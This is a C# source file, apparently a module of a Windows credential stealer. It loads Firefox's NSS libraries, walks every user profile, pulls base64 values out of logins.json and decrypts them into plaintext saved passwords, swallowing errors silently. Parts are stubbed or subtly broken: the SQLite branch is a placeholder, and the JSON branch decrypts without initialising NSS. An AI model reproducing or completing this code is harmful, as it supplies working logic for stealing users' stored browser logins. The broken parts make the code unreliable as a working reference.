using System;
using System.Collections.Generic;
using System.IO;
using System.Runtime.InteropServices;
using System.Text;

namespace SHARP
{
	internal class GDecryptor
	{
		public static IntPtr NSS3;
		private static string ffoldername = "\\Mozilla Firefox\\";

		[DllImport("kernel32.dll")]
		public static extern IntPtr LoadLibrary(string dllFilePath);

		[DllImport("kernel32", CharSet = CharSet.Ansi, SetLastError = true)]
		public static extern IntPtr GetProcAddress(IntPtr hModule, string procName);

		public static long NSS_Init(string configdir)
		{
			string path = "C:\\Program Files" + ffoldername;
			if (!Directory.Exists(path))
				path = "C:\\Program Files (x86)" + ffoldername;

			if (!Directory.Exists(path))
				return -100;

			LoadLibrary(path + "mozglue.dll");
			NSS3 = LoadLibrary(path + "nss3.dll");

			var nssInitDelegate = (DLLFunctionDelegate)Marshal.GetDelegateForFunctionPointer(
				GetProcAddress(NSS3, "NSS_Init"),
				typeof(DLLFunctionDelegate));

			return nssInitDelegate(configdir);
		}

		public static string Decrypt(string cypherText)
		{
			IntPtr dataPtr = IntPtr.Zero;
			try
			{
				byte[] source = Convert.FromBase64String(cypherText);
				dataPtr = Marshal.AllocHGlobal(source.Length);
				Marshal.Copy(source, 0, dataPtr, source.Length);

				// Korrektur: TSECItem-Instanz erstellen, nicht im ref-Parameter
				TSECItem data = new TSECItem
				{
					SECItemType = 0,
					SECItemData = dataPtr,
					SECItemLen = source.Length
				};

				TSECItem result = new TSECItem();

				if (PK11SDR_Decrypt(ref data, ref result, 0) == 0)
				{
					if (result.SECItemLen != 0)
					{
						byte[] decryptedData = new byte[result.SECItemLen];
						Marshal.Copy(result.SECItemData, decryptedData, 0, result.SECItemLen);
						return Encoding.UTF8.GetString(decryptedData);
					}
				}
			}
			catch (Exception ex)
			{
				Console.WriteLine($"Decryption error: {ex}");
				return null;
			}
			finally
			{
				if (dataPtr != IntPtr.Zero)
					Marshal.FreeHGlobal(dataPtr);
			}
			return null;
		}

		public static int PK11SDR_Decrypt(ref TSECItem data, ref TSECItem result, int cx)
		{
			var decryptDelegate = (DLLFunctionDelegate5)Marshal.GetDelegateForFunctionPointer(
				GetProcAddress(NSS3, "PK11SDR_Decrypt"),
				typeof(DLLFunctionDelegate5));

			return decryptDelegate(ref data, ref result, cx);
		}

		// NSS_Shutdown für Cleanup
		public static long NSS_Shutdown()
		{
			var nssShutdownDelegate = (DLLFunctionDelegate)Marshal.GetDelegateForFunctionPointer(
				GetProcAddress(NSS3, "NSS_Shutdown"),
				typeof(DLLFunctionDelegate));

			return nssShutdownDelegate(null);
		}

		// Delegate-Definitionen
		[UnmanagedFunctionPointer(CallingConvention.Cdecl)]
		public delegate long DLLFunctionDelegate(string configdir);

		[UnmanagedFunctionPointer(CallingConvention.Cdecl)]
		public delegate int DLLFunctionDelegate5(ref TSECItem data, ref TSECItem result, int cx);

		// Struktur für NSS
		public struct TSECItem
		{
			public int SECItemType;
			public IntPtr SECItemData;
			public int SECItemLen;
		}

		// Verbesserte Methode zum Extrahieren von Firefox-Passwörtern
		public static List<string> ExtractFirefoxPasswords()
		{
			var passwords = new List<string>();
			string[] firefoxProfiles = GetFirefoxProfilePaths();

			foreach (string profile in firefoxProfiles)
			{
				string signonsFile = Path.Combine(profile, "signons.sqlite");
				string loginsFile = Path.Combine(profile, "logins.json");

				if (File.Exists(signonsFile))
				{
					// SQLite-Datenbank für ältere Firefox-Versionen
					ExtractFromSQLite(signonsFile, passwords);
				}

				if (File.Exists(loginsFile))
				{
					// JSON-Datei für neuere Firefox-Versionen
					ExtractFromJSON(loginsFile, passwords);
				}
			}

			return passwords;
		}

		private static string[] GetFirefoxProfilePaths()
		{
			string appData = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData);
			string firefoxPath = Path.Combine(appData, "Mozilla", "Firefox", "Profiles");

			if (Directory.Exists(firefoxPath))
			{
				return Directory.GetDirectories(firefoxPath, "*.default*", SearchOption.TopDirectoryOnly);
			}

			return new string[0];
		}

		private static void ExtractFromSQLite(string sqlitePath, List<string> passwords)
		{
			try
			{
				// Hier müsste SQLite-Parser implementiert werden
				// Vereinfachte Version:
				if (NSS_Init(Path.GetDirectoryName(sqlitePath)) == 0)
				{
					// Datenbank öffnen und entschlüsseln...
					// NSS_Shutdown(); nicht vergessen!
				}
			}
			catch { }
		}

		private static void ExtractFromJSON(string jsonPath, List<string> passwords)
		{
			try
			{
				string jsonContent = File.ReadAllText(jsonPath);
				// JSON parsen und entschlüsselte Passwörter extrahieren
				// Vereinfacht: Suche nach base64-Strings
				string[] parts = jsonContent.Split(new[] { '"' }, StringSplitOptions.RemoveEmptyEntries);

				foreach (string part in parts)
				{
					if (part.Length > 50 && IsBase64String(part))
					{
						string decrypted = Decrypt(part);
						if (!string.IsNullOrEmpty(decrypted))
							passwords.Add(decrypted);
					}
				}
			}
			catch { }
		}

		private static bool IsBase64String(string s)
		{
			try
			{
				Convert.FromBase64String(s);
				return true;
			}
			catch
			{
				return false;
			}
		}
	}
}